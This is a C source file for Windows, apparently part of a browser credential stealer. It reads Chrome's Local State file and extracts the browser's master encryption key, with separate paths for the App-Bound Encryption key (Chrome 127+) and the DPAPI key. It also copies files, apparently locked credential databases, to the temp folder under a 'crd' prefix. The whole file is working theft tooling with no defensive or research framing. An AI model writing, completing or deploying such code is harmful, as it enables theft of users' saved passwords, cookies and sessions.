#include "strutil.h"
#include <shlobj.h>
#include <wincrypt.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#pragma comment(lib, "crypt32.lib")

char* build_local_path(const wchar_t* relative) {
    wchar_t local_app[MAX_PATH];
    if (FAILED(SHGetFolderPathW(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, local_app)))
        return NULL;

    wchar_t full_w[MAX_PATH * 2];
    _snwprintf(full_w, sizeof(full_w) / sizeof(wchar_t), L"%s\\%s", local_app, relative);

    int needed = WideCharToMultiByte(CP_UTF8, 0, full_w, -1, NULL, 0, NULL, NULL);
    char* result = (char*)malloc(needed);
    if (result)
        WideCharToMultiByte(CP_UTF8, 0, full_w, -1, result, needed, NULL, NULL);
    return result;
}

PBYTE read_file_bin(const char* path, DWORD* out_size) {
    HANDLE hf = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE,
                            NULL, OPEN_EXISTING, 0, NULL);
    if (hf == INVALID_HANDLE_VALUE)
        return NULL;

    DWORD size = GetFileSize(hf, NULL);
    if (size == INVALID_FILE_SIZE || size == 0) {
        CloseHandle(hf);
        return NULL;
    }

    PBYTE buf = (PBYTE)malloc(size + 1);
    if (!buf) { CloseHandle(hf); return NULL; }

    DWORD read;
    if (!ReadFile(hf, buf, size, &read, NULL) || read != size) {
        free(buf);
        CloseHandle(hf);
        return NULL;
    }
    buf[size] = 0;
    CloseHandle(hf);
    *out_size = size;
    return buf;
}

static PBYTE decode_json_b64_value(const char* file_data, const char* needle,
                                    DWORD* out_decoded_len) {
    char* pos = strstr(file_data, needle);
    if (!pos) return NULL;
    pos += strlen(needle);

    char* end = strchr(pos, '"');
    if (!end) return NULL;

    DWORD b64_len = (DWORD)(end - pos);
    if (b64_len == 0) return NULL;

    char* b64 = (char*)malloc(b64_len + 1);
    memcpy(b64, pos, b64_len);
    b64[b64_len] = 0;

    DWORD decoded_len = 0;
    if (!CryptStringToBinaryA(b64, b64_len, CRYPT_STRING_BASE64, NULL, &decoded_len, NULL, NULL)) {
        free(b64);
        return NULL;
    }

    PBYTE decoded = (PBYTE)malloc(decoded_len);
    if (!CryptStringToBinaryA(b64, b64_len, CRYPT_STRING_BASE64, decoded, &decoded_len, NULL, NULL)) {
        free(b64);
        free(decoded);
        return NULL;
    }
    free(b64);

    *out_decoded_len = decoded_len;
    return decoded;
}

PBYTE extract_browser_key(const char* local_state_path, DWORD* out_len, KEY_TYPE* out_type) {
    DWORD file_size;
    PBYTE file_data = read_file_bin(local_state_path, &file_size);
    if (!file_data) {
        *out_type = KEY_NONE;
        return NULL;
    }

    // Try ABE key first (Chrome 127+)
    DWORD decoded_len;
    PBYTE decoded = decode_json_b64_value((char*)file_data, "\"app_bound_encrypted_key\":\"", &decoded_len);
    if (decoded && decoded_len > 4) {
        free(file_data);
        DWORD key_len = decoded_len - 4;
        PBYTE key = (PBYTE)malloc(key_len);
        memcpy(key, decoded + 4, key_len);
        free(decoded);
        *out_len = key_len;
        *out_type = KEY_ABE;
        return key;
    }
    if (decoded) free(decoded);

    // Fallback: DPAPI key (os_crypt.encrypted_key)
    decoded = decode_json_b64_value((char*)file_data, "\"encrypted_key\":\"", &decoded_len);
    free(file_data);
    if (decoded && decoded_len > 5 && memcmp(decoded, "DPAPI", 5) == 0) {
        DWORD key_len = decoded_len - 5;
        PBYTE key = (PBYTE)malloc(key_len);
        memcpy(key, decoded + 5, key_len);
        free(decoded);
        *out_len = key_len;
        *out_type = KEY_DPAPI;
        return key;
    }
    if (decoded) free(decoded);

    *out_type = KEY_NONE;
    return NULL;
}

PBYTE extract_abe_key(const char* local_state_path, DWORD* out_len) {
    KEY_TYPE type;
    PBYTE key = extract_browser_key(local_state_path, out_len, &type);
    if (type != KEY_ABE) {
        free(key);
        return NULL;
    }
    return key;
}

char* copy_to_temp(const char* src_path) {
    char temp_dir[MAX_PATH];
    GetTempPathA(MAX_PATH, temp_dir);

    char temp_file[MAX_PATH];
    GetTempFileNameA(temp_dir, "crd", 0, temp_file);

    if (!CopyFileA(src_path, temp_file, FALSE))
        return NULL;

    char* result = _strdup(temp_file);
    return result;
}
